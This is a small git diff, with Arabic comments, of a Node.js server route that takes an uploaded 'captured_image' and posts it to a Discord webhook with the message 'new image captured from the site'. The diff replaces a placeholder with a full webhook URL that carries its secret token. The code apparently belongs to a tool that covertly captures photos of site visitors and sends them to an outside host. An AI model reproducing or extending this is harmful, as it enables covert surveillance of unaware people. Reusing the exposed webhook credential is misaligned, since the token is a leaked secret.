@@ -18,7 +18,7 @@ app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
         discordData.append('content', '🚨 **تم التقاط صورة جديدة من الموقع!**');
 
         // ضع رابط الـ Webhook الخاص بك هنا بين العلامتين ''
-        const DISCORD_WEBHOOK_URL = 'ضع_رابط_الـ_Webhook_الذي_نسخته_هنا';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525465698317373540/iGdJxuIPPgFXaxss4xX0LjUEnsvZ1cR5ZG8AtqHWtzuusLUpGN27kNNvTm6Kh0IAamma';
 
         // إرسال الصورة عبر طلب POST إلى ديسكورد
         await axios.post(DISCORD_WEBHOOK_URL, discordData, {
